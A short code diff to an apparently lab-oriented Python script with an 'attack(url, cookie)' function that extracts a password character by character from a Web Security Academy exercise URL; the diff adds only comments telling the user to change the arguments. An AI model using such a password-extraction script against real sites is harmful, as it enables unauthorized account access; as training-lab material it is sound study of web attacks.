@@ -1,3 +1,5 @@
+#Change Arguments in attack function.
+
 import string
 import requests
 
@@ -21,4 +23,4 @@ def attack(url, cookie):
               password = password+j
               break
       print(password)
-attack("https://ac821fe51e4d9702c0196daf009b0033.web-security-academy.net/filter?category=Accessories","cFTSmPy5ZBKh7Av8")
+attack("https://ac821fe51e4d9702c0196daf009b0033.web-security-academy.net/filter?category=Accessories","cFTSmPy5ZBKh7Av8") #change this
